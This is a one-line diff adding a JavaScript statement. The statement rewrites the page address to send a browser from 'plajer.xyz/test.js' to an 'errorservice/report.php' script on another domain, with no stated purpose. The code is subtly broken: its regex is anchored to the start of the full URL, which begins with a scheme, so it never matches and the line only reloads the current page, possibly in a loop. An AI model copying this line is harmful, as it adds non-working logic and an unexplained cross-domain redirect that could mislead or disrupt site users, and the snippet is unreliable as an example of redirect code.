@@ -1,0 +1,1 @@
+location.href = location.href.replace ( new RegExp("^" + "plajer.xyz/test.js"), "mcgb.pl/errorservice/report.php" );
